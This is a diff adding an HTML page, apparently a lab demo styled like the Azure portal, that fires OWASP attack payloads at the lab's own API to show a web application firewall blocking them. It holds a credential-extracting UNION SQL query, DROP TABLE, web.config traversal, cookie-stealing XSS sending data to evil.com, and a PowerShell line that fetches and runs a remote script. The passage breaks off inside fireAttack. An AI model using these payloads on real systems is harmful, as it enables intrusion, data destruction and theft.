@@ -1,0 +1,973 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<title>WAF — OWASP Demo | NTMS Azure Lab</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%230078d4'/><text y='.9em' font-size='65' x='8'>🛡️</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600&family=Source+Code+Pro:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root {
+  --az-bg:         #1c1c1c;
+  --az-sidebar:    #171717;
+  --az-panel:      #252526;
+  --az-panel2:     #2d2d2d;
+  --az-border:     #3a3a3a;
+  --az-border2:    #454545;
+  --az-blue:       #0078d4;
+  --az-blue-light: #2899f5;
+  --az-blue-dim:   #003a6c;
+  --az-hover:      #2a2a2a;
+  --az-selected:   #094771;
+  --az-text:       #cccccc;
+  --az-text-dim:   #888888;
+  --az-text-bright:#ffffff;
+  --az-red:        #f1707a;
+  --az-red-dim:    #a1141e;
+  --az-green:      #4ec9b0;
+  --az-green-dim:  #1e6b5a;
+  --az-yellow:     #dcdcaa;
+  --az-orange:     #ce9178;
+  --az-purple:     #c586c0;
+  --az-command:    #323233;
+  --az-blade:      #1e1e1e;
+  --font:          'Segoe UI', system-ui, sans-serif;
+  --mono:          'Source Code Pro', 'Cascadia Code', monospace;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; overflow: hidden; }
+
+body {
+  font-family: var(--font);
+  background: var(--az-bg);
+  color: var(--az-text);
+  display: flex;
+  flex-direction: column;
+  font-size: 16px;
+}
+
+/* ── AZURE TOP BAR ── */
+.az-topbar {
+  height: 48px;
+  background: var(--az-blue);
+  display: flex;
+  align-items: center;
+  padding: 0 16px;
+  gap: 12px;
+  flex-shrink: 0;
+  z-index: 300;
+}
+.az-topbar-logo {
+  display: flex; align-items: center; gap: 8px;
+  color: white; font-size: 17px; font-weight: 600;
+  letter-spacing: 0.01em;
+}
+.az-topbar-logo svg { width: 20px; height: 20px; }
+.az-topbar-sep { width: 1px; height: 20px; background: rgba(255,255,255,0.3); }
+.az-topbar-title { color: rgba(255,255,255,0.9); font-size: 16px; }
+.az-topbar-right { margin-left: auto; display: flex; align-items: center; gap: 8px; }
+.az-topbar-btn {
+  background: none; border: none; color: rgba(255,255,255,0.85);
+  padding: 4px 12px; font-family: var(--font); font-size: 15px;
+  cursor: pointer; border-radius: 2px; transition: background 0.15s;
+  display: flex; align-items: center; gap: 6px;
+}
+.az-topbar-btn:hover { background: rgba(255,255,255,0.15); }
+.az-topbar-icon { font-size: 17px; }
+
+/* ── LAYOUT ── */
+.az-layout {
+  flex: 1;
+  display: flex;
+  overflow: hidden;
+  min-height: 0;
+}
+
+/* ── LEFT NAV ── */
+.az-nav {
+  width: 220px;
+  background: var(--az-sidebar);
+  border-right: 1px solid var(--az-border);
+  display: flex; flex-direction: column;
+  overflow-y: auto; flex-shrink: 0;
+}
+.az-nav-section {
+  padding: 8px 0;
+  border-bottom: 1px solid var(--az-border);
+}
+.az-nav-header {
+  padding: 6px 16px 4px;
+  font-size: 16px; font-weight: 600;
+  letter-spacing: 0.1em; text-transform: uppercase;
+  color: var(--az-text-dim);
+}
+.az-nav-item {
+  display: flex; align-items: center; gap: 10px;
+  padding: 7px 16px;
+  cursor: pointer; transition: background 0.1s;
+  border-left: 2px solid transparent;
+  color: var(--az-text);
+  font-size: 15px;
+}
+.az-nav-item:hover { background: var(--az-hover); }
+.az-nav-item.active {
+  background: var(--az-selected);
+  border-left-color: var(--az-blue-light);
+  color: white;
+}
+.az-nav-item .nav-icon { font-size: 17px; width: 18px; text-align: center; }
+.az-nav-badge {
+  margin-left: auto;
+  background: var(--az-blue-dim);
+  color: var(--az-blue-light);
+  font-size: 16px; font-weight: 600;
+  padding: 1px 6px; border-radius: 10px;
+}
+.az-nav-badge.red { background: rgba(241,112,122,0.15); color: var(--az-red); }
+.az-nav-badge.green { background: rgba(78,201,176,0.15); color: var(--az-green); }
+
+/* ── MAIN CONTENT ── */
+.az-content {
+  flex: 1; display: flex; flex-direction: column;
+  overflow: hidden; min-height: 0;
+}
+
+/* ── BREADCRUMB ── */
+.az-breadcrumb {
+  height: 42px; background: var(--az-panel);
+  border-bottom: 1px solid var(--az-border);
+  display: flex; align-items: center;
+  padding: 0 20px; gap: 6px;
+  font-size: 15px; flex-shrink: 0;
+}
+.az-breadcrumb a { color: var(--az-blue-light); cursor: pointer; text-decoration: none; }
+.az-breadcrumb a:hover { text-decoration: underline; }
+.az-breadcrumb .sep { color: var(--az-text-dim); font-size: 16px; }
+.az-breadcrumb .current { color: var(--az-text); }
+
+/* ── COMMAND BAR ── */
+.az-cmdbar {
+  height: 46px; background: var(--az-command);
+  border-bottom: 1px solid var(--az-border);
+  display: flex; align-items: center;
+  padding: 0 16px; gap: 4px; flex-shrink: 0;
+}
+.az-cmd {
+  background: none; border: none;
+  color: var(--az-text); font-family: var(--font); font-size: 15px;
+  padding: 5px 12px; cursor: pointer; border-radius: 2px;
+  display: flex; align-items: center; gap: 6px;
+  transition: background 0.1s;
+}
+.az-cmd:hover { background: var(--az-hover); }
+.az-cmd .cmd-icon { font-size: 16px; }
+.az-cmd-sep { width: 1px; height: 20px; background: var(--az-border2); margin: 0 4px; }
+
+/* ── WAF STATUS STRIP ── */
+.az-status-strip {
+  background: var(--az-panel2);
+  border-bottom: 1px solid var(--az-border);
+  padding: 6px 20px;
+  display: flex; align-items: center; gap: 20px;
+  font-size: 17px; flex-shrink: 0;
+}
+.az-status-item { display: flex; align-items: center; gap: 6px; color: var(--az-text-dim); }
+.az-status-item .dot {
+  width: 7px; height: 7px; border-radius: 50%;
+}
+.dot-green { background: #4ec9b0; box-shadow: 0 0 6px rgba(78,201,176,0.6); }
+.dot-red   { background: #f1707a; box-shadow: 0 0 6px rgba(241,112,122,0.6); }
+.dot-yellow{ background: #dcdcaa; }
+.az-status-val { color: var(--az-text-bright); font-weight: 600; }
+.az-mode-chip {
+  margin-left: auto;
+  background: rgba(0,120,212,0.2);
+  border: 1px solid rgba(0,120,212,0.5);
+  color: var(--az-blue-light);
+  padding: 2px 10px; border-radius: 2px;
+  font-size: 16px; font-weight: 600; letter-spacing: 0.06em;
+}
+
+/* ── SCROLL AREA ── */
+.az-scroll { flex: 1; overflow-y: auto; padding: 20px; min-height: 0; }
+
+/* ── PAGE TITLE ── */
+.az-page-title {
+  display: flex; align-items: center; gap: 14px;
+  margin-bottom: 20px;
+}
+.az-page-icon {
+  width: 44px; height: 44px;
+  background: linear-gradient(135deg, #0078d4, #004578);
+  border-radius: 4px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 22px;
+}
+.az-page-title h1 { font-size: 22px; font-weight: 600; color: var(--az-text-bright); }
+.az-page-title p  { font-size: 15px; color: var(--az-text-dim); margin-top: 2px; }
+
+/* ── METRIC TILES ── */
+.az-metrics {
+  display: grid; grid-template-columns: repeat(4, 1fr);
+  gap: 12px; margin-bottom: 20px;
+}
+.az-metric-tile {
+  background: var(--az-panel);
+  border: 1px solid var(--az-border);
+  border-radius: 3px; padding: 14px 16px;
+  transition: border-color 0.2s;
+}
+.az-metric-tile:hover { border-color: var(--az-border2); }
+.az-metric-val {
+  font-size: 32px; font-weight: 300; line-height: 1;
+  color: var(--az-text-bright); margin-bottom: 4px;
+}
+.az-metric-val.blue   { color: var(--az-blue-light); }
+.az-metric-val.red    { color: var(--az-red); }
+.az-metric-val.green  { color: var(--az-green); }
+.az-metric-val.yellow { color: var(--az-yellow); }
+.az-metric-lbl { font-size: 17px; color: var(--az-text-dim); }
+.az-metric-sub { font-size: 16px; color: var(--az-text-dim); margin-top: 6px; padding-top: 6px; border-top: 1px solid var(--az-border); }
+
+/* ── ATTACK GRID ── */
+.az-attack-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(480px, 1fr));
+  gap: 16px;
+  margin-bottom: 20px;
+}
+
+/* ── ATTACK BLADE ── */
+.az-blade {
+  background: var(--az-panel);
+  border: 1px solid var(--az-border);
+  border-radius: 3px;
+  overflow: hidden;
+  animation: az-fadein 0.3s ease both;
+}
+.az-blade:hover { border-color: var(--az-border2); }
+
+.az-blade-header {
+  background: var(--az-panel2);
+  padding: 10px 16px;
+  display: flex; align-items: center; gap: 12px;
+  border-bottom: 1px solid var(--az-border);
+}
+.az-blade-icon {
+  width: 32px; height: 32px; border-radius: 3px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 16px; flex-shrink: 0;
+}
+.icon-sql  { background: rgba(241,112,122,0.15); }
+.icon-xss  { background: rgba(220,220,170,0.12); }
+.icon-path { background: rgba(0,120,212,0.15); }
+.icon-cmd  { background: rgba(78,201,176,0.12); }
+
+.az-blade-title { font-size: 16px; font-weight: 600; color: var(--az-text-bright); }
+.az-blade-sub   { font-size: 17px; color: var(--az-text-dim); margin-top: 1px; }
+
+.az-severity {
+  margin-left: auto;
+  font-size: 16px; font-weight: 600;
+  padding: 2px 8px; border-radius: 2px;
+  letter-spacing: 0.06em;
+}
+.sev-critical { background: rgba(241,112,122,0.15); color: var(--az-red); border: 1px solid rgba(241,112,122,0.3); }
+.sev-high     { background: rgba(220,130,0,0.15);   color: #e6a020;      border: 1px solid rgba(220,130,0,0.3); }
+
+.az-blade-body { padding: 14px 16px; }
+
+.az-field-label {
+  font-size: 17px; font-weight: 600; color: var(--az-text-dim);
+  letter-spacing: 0.06em; text-transform: uppercase;
+  margin-bottom: 5px; margin-top: 12px;
+}
+.az-field-label:first-child { margin-top: 0; }
+
+.az-desc {
+  font-size: 15px; color: var(--az-text-dim);
+  line-height: 1.6; margin-bottom: 4px;
+}
+
+.az-select {
+  width: 100%; background: var(--az-bg);
+  border: 1px solid var(--az-border2);
+  color: var(--az-text); padding: 6px 10px;
+  font-family: var(--font); font-size: 15px;
+  border-radius: 2px; outline: none; cursor: pointer;
+  transition: border-color 0.15s;
+}
+.az-select:focus { border-color: var(--az-blue); box-shadow: 0 0 0 1px var(--az-blue); }
+
+.az-payload-box {
+  background: var(--az-blade);
+  border: 1px solid var(--az-border);
+  border-left: 3px solid var(--az-red-dim);
+  border-radius: 2px; padding: 8px 12px;
+  font-family: var(--mono); font-size: 15px;
+  color: var(--az-orange); word-break: break-all;
+  line-height: 1.5; min-height: 36px;
+}
+
+/* ── FIRE BUTTON ── */
+.az-fire-btn {
+  width: 100%; margin-top: 12px;
+  background: var(--az-blue);
+  color: white; border: none;
+  padding: 8px 16px;
+  font-family: var(--font); font-size: 16px; font-weight: 600;
+  cursor: pointer; border-radius: 2px;
+  display: flex; align-items: center; justify-content: center; gap: 8px;
+  transition: background 0.15s;
+}
+.az-fire-btn:hover { background: var(--az-blue-light); }
+.az-fire-btn:active { background: #005a9e; }
+.az-fire-btn:disabled {
+  background: var(--az-panel2); color: var(--az-text-dim);
+  cursor: not-allowed;
+}
+
+/* ── RESULT BOX ── */
+.az-result {
+  margin-top: 12px; border-radius: 2px; padding: 12px;
+  display: none; animation: az-fadein 0.2s ease;
+  font-size: 15px;
+}
+.az-result.blocked {
+  background: rgba(78,201,176,0.06);
+  border: 1px solid rgba(78,201,176,0.25);
+  display: block;
+}
+.az-result.passed {
+  background: rgba(241,112,122,0.06);
+  border: 1px solid rgba(241,112,122,0.25);
+  display: block;
+}
+.az-result.loading {
+  background: rgba(0,120,212,0.06);
+  border: 1px solid rgba(0,120,212,0.25);
+  display: block;
+}
+
+.az-result-header {
+  display: flex; align-items: center; gap: 8px;
+  margin-bottom: 8px;
+}
+.az-result-title { font-weight: 600; font-size: 15px; }
+.az-result-title.green { color: var(--az-green); }
+.az-result-title.red   { color: var(--az-red); }
+.az-result-title.blue  { color: var(--az-blue-light); }
+
+.az-http-badge {
+  font-size: 16px; font-weight: 700; padding: 1px 7px;
+  border-radius: 2px; letter-spacing: 0.04em;
+}
+.badge-403 { background: rgba(78,201,176,0.2);  color: var(--az-green); border: 1px solid rgba(78,201,176,0.3); }
+.badge-200 { background: rgba(241,112,122,0.2); color: var(--az-red);   border: 1px solid rgba(241,112,122,0.3); }
+
+.az-result-body { font-size: 17px; color: var(--az-text-dim); line-height: 1.6; }
+
+.az-waf-rule {
+  display: flex; align-items: center; gap: 8px;
+  margin-top: 8px; padding: 6px 10px;
+  background: rgba(78,201,176,0.05);
+  border: 1px solid rgba(78,201,176,0.15);
+  border-radius: 2px; font-size: 17px;
+}
+.az-waf-rule .rule-id { color: var(--az-green); font-family: var(--mono); font-weight: 600; }
+.az-waf-rule .rule-name { color: var(--az-text-dim); }
+
+.az-response-code {
+  margin-top: 8px;
+  background: var(--az-blade);
+  border: 1px solid var(--az-border);
+  border-radius: 2px; padding: 10px 12px;
+  font-family: var(--mono); font-size: 17px;
+  color: var(--az-orange);
+  max-height: 180px; overflow-y: auto;
+  white-space: pre-wrap; word-break: break-all;
+  line-height: 1.6;
+}
+.az-attack-label { color: var(--az-red); font-size: 17px; font-weight: 600; margin-bottom: 4px; }
+
+/* ── LOG PANEL ── */
+.az-log-panel {
+  background: var(--az-panel);
+  border: 1px solid var(--az-border);
+  border-radius: 3px; overflow: hidden;
+}
+.az-log-header {
+  background: var(--az-panel2); padding: 8px 14px;
+  display: flex; align-items: center; justify-content: space-between;
+  border-bottom: 1px solid var(--az-border);
+}
+.az-log-title {
+  display: flex; align-items: center; gap: 8px;
+  font-size: 15px; font-weight: 600; color: var(--az-text);
+}
+.az-log-title .live-dot {
+  width: 6px; height: 6px; border-radius: 50%;
+  background: var(--az-green); animation: az-blink 1.5s ease-in-out infinite;
+}
+.az-log-clear {
+  background: none; border: 1px solid var(--az-border);
+  color: var(--az-text-dim); font-family: var(--font); font-size: 17px;
+  padding: 2px 10px; cursor: pointer; border-radius: 2px;
+  transition: all 0.15s;
+}
+.az-log-clear:hover { border-color: var(--az-blue); color: var(--az-blue-light); }
+.az-log-body {
+  background: var(--az-blade);
+  padding: 10px 14px; height: 180px;
+  overflow-y: auto; font-family: var(--mono); font-size: 17px;
+  line-height: 1.8;
+}
+.log-row { display: flex; gap: 10px; align-items: baseline; }
+.log-ts   { color: #555; flex-shrink: 0; font-size: 16px; }
+.log-tag  { flex-shrink: 0; padding: 0 5px; border-radius: 2px; font-size: 9px; font-weight: 700; letter-spacing: 0.06em; }
+.log-tag.BLOCK { background: rgba(78,201,176,0.15); color: var(--az-green); }
+.log-tag.PASS  { background: rgba(241,112,122,0.15); color: var(--az-red); }
+.log-tag.FIRE  { background: rgba(220,220,170,0.12); color: var(--az-yellow); }
+.log-tag.INFO  { background: rgba(0,120,212,0.12);   color: var(--az-blue-light); }
+.log-msg  { color: var(--az-text); font-size: 17px; }
+
+/* ── KEYFRAMES ── */
+@keyframes az-fadein { from { opacity:0; transform:translateY(6px); } to { opacity:1; transform:translateY(0); } }
+@keyframes az-blink  { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
+
+/* ── SCROLLBAR ── */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: var(--az-sidebar); }
+::-webkit-scrollbar-thumb { background: #555; border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: #777; }
+
+/* ── MOBILE ── */
+@media (max-width: 768px) {
+  .az-nav { display: none; }
+  .az-attack-grid { grid-template-columns: 1fr; }
+  .az-metrics { grid-template-columns: repeat(2,1fr); }
+  .az-scroll { padding: 12px; }
+}
+</style>
+</head>
+<body>
+
+<!-- AZURE TOP BAR -->
+<div class="az-topbar">
+  <div class="az-topbar-logo">
+    <svg viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M6.5 1L1 10.5H6L4.5 14L13 4H8.5L11 1H6.5Z" fill="white" opacity="0.9"/>
+      <path d="M8 8L5 14H17L8 8Z" fill="white" opacity="0.6"/>
+    </svg>
+    Microsoft Azure
+  </div>
+  <div class="az-topbar-sep"></div>
+  <div class="az-topbar-title">NTMS Lab Subscription</div>
+  <div class="az-topbar-right">
+    <button class="az-topbar-btn" onclick="window.location.href='/index.html'">
+      <span class="az-topbar-icon">🏪</span> Back to Store
+    </button>
+    <button class="az-topbar-btn">
+      <span class="az-topbar-icon">👤</span> vmadmin
+    </button>
+    <button class="az-topbar-btn">
+      <span class="az-topbar-icon">❓</span>
+    </button>
+  </div>
+</div>
+
+<div class="az-layout">
+
+  <!-- LEFT NAV -->
+  <div class="az-nav">
+    <div class="az-nav-section">
+      <div class="az-nav-header">Application Gateway</div>
+      <div class="az-nav-item active">
+        <span class="nav-icon">🛡️</span> WAF Demo
+        <span class="az-nav-badge" id="nav-blocked">0</span>
+      </div>
+      <div class="az-nav-item">
+        <span class="nav-icon">📊</span> Overview
+      </div>
+      <div class="az-nav-item">
+        <span class="nav-icon">⚙️</span> Configuration
+      </div>
+      <div class="az-nav-item">
+        <span class="nav-icon">📋</span> Diagnostic logs
+      </div>
+    </div>
+    <div class="az-nav-section">
+      <div class="az-nav-header">Monitoring</div>
+      <div class="az-nav-item">
+        <span class="nav-icon">📈</span> Metrics
+      </div>
+      <div class="az-nav-item">
+        <span class="nav-icon">🔔</span> Alerts
+        <span class="az-nav-badge red" id="nav-passed">0</span>
+      </div>
+      <div class="az-nav-item">
+        <span class="nav-icon">🗒️</span> Activity log
+      </div>
+    </div>
+    <div class="az-nav-section">
+      <div class="az-nav-header">OWASP Rules</div>
+      <div class="az-nav-item">
+        <span class="nav-icon">💉</span> SQLi — 942xxx
+        <span class="az-nav-badge green">ON</span>
+      </div>
+      <div class="az-nav-item">
+        <span class="nav-icon">📜</span> XSS — 941xxx
+        <span class="az-nav-badge green">ON</span>
+      </div>
+      <div class="az-nav-item">
+        <span class="nav-icon">📁</span> LFI — 930xxx
+        <span class="az-nav-badge green">ON</span>
+      </div>
+      <div class="az-nav-item">
+        <span class="nav-icon">💻</span> RCE — 932xxx
+        <span class="az-nav-badge green">ON</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <div class="az-content">
+
+    <!-- BREADCRUMB -->
+    <div class="az-breadcrumb">
+      <a>Home</a><span class="sep">›</span>
+      <a>NTMS-Lab-RG</a><span class="sep">›</span>
+      <a>ntms-appgw-waf</a><span class="sep">›</span>
+      <span class="current">WAF Demo — OWASP Top 10</span>
+    </div>
+
+    <!-- COMMAND BAR -->
+    <div class="az-cmdbar">
+      <button class="az-cmd" onclick="resetAll()">
+        <span class="cmd-icon">🔄</span> Reset all
+      </button>
+      <button class="az-cmd" onclick="fireAll()">
+        <span class="cmd-icon">⚡</span> Fire all attacks
+      </button>
+      <div class="az-cmd-sep"></div>
+      <button class="az-cmd">
+        <span class="cmd-icon">📥</span> Export log
+      </button>
+      <button class="az-cmd">
+        <span class="cmd-icon">🔗</span> WAF policy
+      </button>
+    </div>
+
+    <!-- STATUS STRIP -->
+    <div class="az-status-strip">
+      <div class="az-status-item">
+        <div class="dot dot-green"></div>
+        App Gateway: <span class="az-status-val">Running</span>
+      </div>
+      <div class="az-status-item">
+        Attacks fired: <span class="az-status-val" id="st-fired">0</span>
+      </div>
+      <div class="az-status-item">
+        <div class="dot dot-green"></div>
+        WAF blocked: <span class="az-status-val" id="st-blocked">0</span>
+      </div>
+      <div class="az-status-item">
+        <div class="dot dot-red"></div>
+        Passed through: <span class="az-status-val" id="st-passed">0</span>
+      </div>
+      <div class="az-status-item">
+        Block rate: <span class="az-status-val" id="st-rate">—</span>
+      </div>
+      <div class="az-mode-chip">WAF: PREVENTION MODE</div>
+    </div>
+
+    <!-- SCROLL AREA -->
+    <div class="az-scroll">
+
+      <!-- PAGE TITLE -->
+      <div class="az-page-title">
+        <div class="az-page-icon">🛡️</div>
+        <div>
+          <h1>WAF Demo — OWASP Top 10</h1>
+          <p>ntms-appgw-waf | Azure Application Gateway | West India</p>
+        </div>
+      </div>
+
+      <!-- METRICS -->
+      <div class="az-metrics">
+        <div class="az-metric-tile">
+          <div class="az-metric-val blue" id="m-fired">0</div>
+          <div class="az-metric-lbl">Total attacks fired</div>
+          <div class="az-metric-sub">Since session start</div>
+        </div>
+        <div class="az-metric-tile">
+          <div class="az-metric-val green" id="m-blocked">0</div>
+          <div class="az-metric-lbl">Blocked by WAF</div>
+          <div class="az-metric-sub">HTTP 403 returned</div>
+        </div>
+        <div class="az-metric-tile">
+          <div class="az-metric-val red" id="m-passed">0</div>
+          <div class="az-metric-lbl">Passed through</div>
+          <div class="az-metric-sub">WAF not active or rule miss</div>
+        </div>
+        <div class="az-metric-tile">
+          <div class="az-metric-val yellow" id="m-rate">0%</div>
+          <div class="az-metric-lbl">Block rate</div>
+          <div class="az-metric-sub">Target: 100%</div>
+        </div>
+      </div>
+
+      <!-- ATTACK CARDS -->
+      <div class="az-attack-grid">
+
+        <!-- SQL INJECTION -->
+        <div class="az-blade" style="animation-delay:0.05s">
+          <div class="az-blade-header">
+            <div class="az-blade-icon icon-sql">💉</div>
+            <div>
+              <div class="az-blade-title">SQL Injection</div>
+              <div class="az-blade-sub">OWASP A03:2021 — Injection · Rule group 942xxx</div>
+            </div>
+            <div class="az-severity sev-critical">CRITICAL</div>
+          </div>
+          <div class="az-blade-body">
+            <div class="az-desc">Injects raw SQL into the product query endpoint. Without WAF, attacker can dump entire DB, bypass auth, or destroy tables.</div>
+            <div class="az-field-label">Payload variant</div>
+            <select class="az-select" id="sql-select" onchange="updatePreview('sql')">
+              <option value="' OR '1'='1">Classic bypass: ' OR '1'='1</option>
+              <option value="' OR 1=1--">Auth bypass: ' OR 1=1--</option>
+              <option value="'; DROP TABLE Products;--">Destructive: DROP TABLE</option>
+              <option value="' UNION SELECT 1,username,password FROM users--">UNION: extract credentials</option>
+              <option value="' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--">Schema enumeration</option>
+            </select>
+            <div class="az-field-label">Attack payload</div>
+            <div class="az-payload-box" id="sql-preview">' OR '1'='1</div>
+            <button class="az-fire-btn" id="sql-btn" onclick="fireAttack('sql')">
+              ▶ Run SQL Injection Test
+            </button>
+            <div class="az-result" id="sql-result"></div>
+          </div>
+        </div>
+
+        <!-- XSS -->
+        <div class="az-blade" style="animation-delay:0.1s">
+          <div class="az-blade-header">
+            <div class="az-blade-icon icon-xss">📜</div>
+            <div>
+              <div class="az-blade-title">Cross-Site Scripting (XSS)</div>
+              <div class="az-blade-sub">OWASP A03:2021 — Injection · Rule group 941xxx</div>
+            </div>
+            <div class="az-severity sev-critical">CRITICAL</div>
+          </div>
+          <div class="az-blade-body">
+            <div class="az-desc">Injects script tags into the API. Reflected back in HTML responses without sanitisation — executes in victim's browser.</div>
+            <div class="az-field-label">Payload variant</div>
+            <select class="az-select" id="xss-select" onchange="updatePreview('xss')">
+              <option value="<script>alert('XSS')</script>">Basic: alert box</option>
+              <option value="<img src=x onerror=alert('XSS')>">IMG onerror event</option>
+              <option value="<svg onload=alert(document.cookie)>">SVG: steal cookie</option>
+              <option value="<iframe src=javascript:alert('XSS')>">iFrame injection</option>
+              <option value="<body onload=fetch('https://evil.com?c='+document.cookie)>">Cookie exfiltration</option>
+            </select>
+            <div class="az-field-label">Attack payload</div>
+            <div class="az-payload-box" id="xss-preview">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+            <button class="az-fire-btn" id="xss-btn" onclick="fireAttack('xss')">
+              ▶ Run XSS Test
+            </button>
+            <div class="az-result" id="xss-result"></div>
+          </div>
+        </div>
+
+        <!-- PATH TRAVERSAL -->
+        <div class="az-blade" style="animation-delay:0.15s">
+          <div class="az-blade-header">
+            <div class="az-blade-icon icon-path">📁</div>
+            <div>
+              <div class="az-blade-title">Path Traversal / LFI</div>
+              <div class="az-blade-sub">OWASP A01:2021 — Broken Access Control · Rule group 930xxx</div>
+            </div>
+            <div class="az-severity sev-high">HIGH</div>
+          </div>
+          <div class="az-blade-body">
+            <div class="az-desc">Reads files outside web root using directory traversal. On Windows IIS, exposes web.config, system files, and secrets.</div>
+            <div class="az-field-label">Payload variant</div>
+            <select class="az-select" id="path-select" onchange="updatePreview('path')">
+              <option value="C:\windows\win.ini">C:\windows\win.ini</option>
+              <option value="..\wwwroot\web.config">..\wwwroot\web.config (IIS site config)</option>
+              <option value="web.config">web.config (ShoppingAPI config)</option>
+              <option value="C:\windows\system32\drivers\etc\hosts">C:\windows\system32\drivers\etc\hosts</option>
+              <option value="C:\windows\system.ini">C:\windows\system.ini</option>
+            </select>
+            <div class="az-field-label">Attack payload</div>
+            <div class="az-payload-box" id="path-preview">C:\windows\win.ini</div>
+            <button class="az-fire-btn" id="path-btn" onclick="fireAttack('path')">
+              ▶ Run Path Traversal Test
+            </button>
+            <div class="az-result" id="path-result"></div>
+          </div>
+        </div>
+
+        <!-- COMMAND INJECTION -->
+        <div class="az-blade" style="animation-delay:0.2s">
+          <div class="az-blade-header">
+            <div class="az-blade-icon icon-cmd">💻</div>
+            <div>
+              <div class="az-blade-title">Command Injection</div>
+              <div class="az-blade-sub">OWASP A03:2021 — Injection · Rule group 932xxx</div>
+            </div>
+            <div class="az-severity sev-critical">CRITICAL</div>
+          </div>
+          <div class="az-blade-body">
+            <div class="az-desc">Passes OS commands via API parameters. On Windows VMs, executes PowerShell/cmd — whoami, net user, or reverse shells.</div>
+            <div class="az-field-label">Payload variant</div>
+            <select class="az-select" id="cmd-select" onchange="updatePreview('cmd')">
+              <option value="whoami">Identify user: whoami</option>
+              <option value="net user">List all users: net user</option>
+              <option value="ipconfig /all">Network info: ipconfig</option>
+              <option value="powershell Get-Process">PowerShell: list processes</option>
+              <option value="powershell Invoke-WebRequest http://evil.com/shell.ps1|iex">Remote code execution</option>
+            </select>
+            <div class="az-field-label">Attack payload</div>
+            <div class="az-payload-box" id="cmd-preview">whoami</div>
+            <button class="az-fire-btn" id="cmd-btn" onclick="fireAttack('cmd')">
+              ▶ Run Command Injection Test
+            </button>
+            <div class="az-result" id="cmd-result"></div>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- WAF LOG -->
+      <div class="az-log-panel">
+        <div class="az-log-header">
+          <div class="az-log-title">
+            <div class="live-dot"></div>
+            WAF Firewall Log — Live
+          </div>
+          <button class="az-log-clear" onclick="clearLog()">Clear</button>
+        </div>
+        <div class="az-log-body" id="waf-log">
+          <div class="log-row">
+            <span class="log-ts">[init]</span>
+            <span class="log-tag INFO">INFO</span>
+            <span class="log-msg">WAF demo session started. Select an attack variant and click Run.</span>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /az-scroll -->
+  </div><!-- /az-content -->
+</div><!-- /az-layout -->
+
+<script>
+const API = 'https://ntms3tappf1.azurewebsites.net/api';
+
+const PAYLOADS = {
+  sql:  ["' OR '1'='1", "' OR 1=1--", "'; DROP TABLE Products;--",
+         "' UNION SELECT 1,username,password FROM users--",
+         "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"],
+  xss:  ["<script>alert('XSS')<\/script>", "<img src=x onerror=alert('XSS')>",
+         "<svg onload=alert(document.cookie)>", "<iframe src=javascript:alert('XSS')>",
+         "<body onload=fetch('https://evil.com?c='+document.cookie)>"],
+  path: ["C:\\windows\\win.ini",
+         "..\\wwwroot\\web.config",
+         "web.config",
+         "C:\\windows\\system32\\drivers\\etc\\hosts",
+         "C:\\windows\\system.ini"],
+  cmd:  ["whoami", "net user", "ipconfig /all",
+         "powershell Get-Process",
+         "powershell Invoke-WebRequest http://evil.com/shell.ps1|iex"]
+};
+
+const WAF_RULES = {
+  sql:  { id: '942100', name: 'SQL Injection Attack Detected via libinjection' },
+  xss:  { id: '941100', name: 'XSS Attack Detected via libinjection' },
+  path: { id: '930100', name: 'Path Traversal Attack (/../)' },
+  cmd:  { id: '932100', name: 'Remote Command Execution: Unix Command Injection' }
+};
+
+const NAMES = {
+  sql: 'SQL Injection', xss: 'XSS', path: 'Path Traversal', cmd: 'Command Injection'
+};
+
+let fired = 0, blocked = 0, passed = 0;
+
+function buildRequest(type, payload) {
+  switch(type) {
+    case 'sql':  return { url: API + '/demo/sqli?q=' + encodeURIComponent(payload), method: 'GET', body: null };
+    case 'xss':  return { url: API + '/demo/xss?q='  + encodeURIComponent(payload), method: 'GET', body: null };
+    case 'path': return { url: API + '/demo/lfi?file='+ encodeURIComponent(payload), method: 'GET', body: null };
+    case 'cmd':  return { url: API + '/demo/cmdi?cmd='+ encodeURIComponent(payload), method: 'GET', body: null };
+  }
+}
+
+function updatePreview(type) {
+  const idx = document.getElementById(type + '-select').selectedIndex;
+  const box = document.getElementById(type + '-preview');
+  box.textContent = PAYLOADS[type][idx];
+}
+
+function updateStats() {
+  [['fired',fired,'blue'],['blocked',blocked,'green'],['passed',passed,'red']].forEach(([k,v,c])=>{
+    document.getElementById('m-' + k).textContent = v;
+    document.getElementById('st-' + k).textContent = v;
+  });
+  const rate = fired > 0 ? Math.round(blocked/fired*100) + '%' : '0%';
+  document.getElementById('m-rate').textContent = rate;
+  document.getElementById('st-rate').textContent = rate;
+  document.getElementById('nav-blocked').textContent = blocked;
+  document.getElementById('nav-passed').textContent  = passed;
+}
+
+async function fireAttack(type) {
+  const idx     = document.getElementById(type + '-select').selectedIndex;
+  const payload = PAYLOADS[type][idx];
+  const req     = buildRequest(type, payload);
+  const btn     = document.getElementById(type + '-btn');
+  const resEl   = document.getElementById(type + '-result');
+  const rule    = WAF_RULES[type];
+
+  btn.disabled = true;
+  btn.textContent = '⏳ Sending request...';
+  resEl.className = 'az-result loading';
+  resEl.innerHTML =
